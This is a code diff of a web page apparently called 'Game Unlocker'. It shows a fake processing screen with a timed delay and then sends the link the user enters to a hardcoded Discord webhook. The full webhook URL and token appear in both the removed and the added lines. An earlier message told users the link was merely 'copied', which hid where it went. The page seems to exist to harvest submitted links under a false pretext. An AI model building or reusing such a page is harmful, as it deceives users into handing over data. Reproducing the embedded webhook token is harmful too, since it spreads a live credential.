@@ -150,22 +150,19 @@
                 return;
             }
 
-            // Show loading screen
             loadingScreen.style.display = 'flex';
             responseArea.style.display = 'none';
 
-            // Simulate processing and send to webhook
             setTimeout(() => {
                 sendToWebhook(link);
-            }, 2000); // 2-second delay for effect
+            }, 2000);
         }
 
-        function sendToWebhook(link) {
-            const webhookURL = 'https://discord.com/api/webhooks/1358759553101070446/YF3N42N2R7pFdBqK6YPKbCRqxMfSr31QzAYgperue1KtAeEynwzbN62V9P2gxmvqJBrR'; // Replace with your webhook URL
+        function sendToWebhook(link) { 
+            // Replace with your Discord webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1358759553101070446/YF3N42N2R7pFdBqK6YPKbCRqxMfSr31QzAYgperue1KtAeEynwzbN62V9P2gxmvqJBrR';
             const data = {
-                link: link,
-                timestamp: new Date().toISOString(),
-                tool: 'Game Unlocker'
+                content: link // Discord expects 'content' for the message
             };
 
             fetch(webhookURL, {
@@ -184,9 +181,9 @@
                 responseArea.style.display = 'block';
 
                 if (response.ok) {
-                    responseText.textContent = 'Link copied successfully! Sent to server.';
+                    responseText.textContent = 'Link sent to Discord successfully!';
                 } else {
-                    responseText.textContent = 'Failed to send link. Try again.';
+                    responseText.textContent = 'Failed to send link. Check your webhook URL or try again.';
                 }
             })
             .catch(error => {
@@ -197,7 +194,7 @@
 
                 loadingScreen.style.display = 'none';
                 responseArea.style.display = 'block';
-                responseText.textContent = 'An error occurred. Check the console.';
+                responseText.textContent = 'An error occurred. See console for details.';
             });
         }
     </script>
